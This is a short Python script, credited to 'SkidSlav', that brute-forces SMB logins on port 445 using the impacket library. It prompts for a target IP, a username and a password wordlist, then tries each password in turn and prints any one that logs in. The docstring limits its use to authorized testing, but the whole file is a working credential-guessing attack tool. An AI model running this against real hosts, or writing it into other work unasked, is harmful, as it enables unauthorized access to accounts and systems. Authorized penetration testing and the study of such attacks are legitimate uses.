"""
SMB Bruteforce - Python port of the original .bat script
Requires:  pip install impacket

For authorized testing / education ONLY — run against systems you own
or have written permission to test.
"""
import time
from impacket.smbconnection import SMBConnection, SMB_DIALECT

def attempt(ip: str, user: str, password: str, timeout: int = 10) -> bool:
    """Try one SMB logon. Returns True on success."""
    try:
        smb = SMBConnection(ip, ip, sess_port=445, timeout=timeout, preferredDialect=SMB_DIALECT)
        smb.login(user, password)

        if smb.isGuestSession():
            smb.close()
            return False

        smb.logoff()
        return True
    except Exception:
        return False

def main():
    print("\nSMB Bruteforce - by SkidSlav (Python edition)\n")

    ip = input("Enter IP Address: ").strip()
    user = input("Enter Username: ").strip()
    wordlist = input("Enter Password List: ").strip()

    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.rstrip("\r\n") for line in f if line.strip()]
    except (FileNotFoundError, PermissionError) as e:
        print(f"\nCould not load wordlist: {e}")
        input("\nPress Enter to exit...")
        return

    print()

    count = 1
    for pwd in passwords:
        print(f"[ATTEMPT {count}] [{pwd}]")
        if attempt(ip, user, pwd):

            print(f"\nPassword Found! {pwd}")
            input("\nPress Enter to exit...")
            return
        count += 1
        time.sleep(0.1)  

    print("\nPassword not Found :(")
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
